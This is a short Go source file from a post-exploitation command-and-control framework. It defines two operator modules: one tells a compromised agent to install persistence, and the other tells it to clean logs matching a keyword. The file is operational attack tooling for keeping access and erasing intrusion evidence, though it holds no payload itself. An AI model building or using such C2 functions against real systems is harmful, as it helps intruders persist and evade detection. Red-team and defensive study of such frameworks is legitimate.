//go:build linux
// +build linux

package cc

import (
	"fmt"

	"github.com/fatih/color"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
)

func modulePersistence() {
	methodOpt, ok := CurrentModuleOptions["method"]
	if !ok {
		LogError("Option 'method' not found")
		return
	}
	cmd := fmt.Sprintf("%s --method %s", emp3r0r_def.C2CmdPersistence, methodOpt.Val)
	err := SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		LogError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}

func moduleLogCleaner() {
	keywordOpt, ok := CurrentModuleOptions["keyword"]
	if !ok {
		LogError("Option 'keyword' not found")
		return
	}
	cmd := fmt.Sprintf("%s --keyword %s", emp3r0r_def.C2CmdCleanLog, keywordOpt.Val)
	err := SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		LogError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
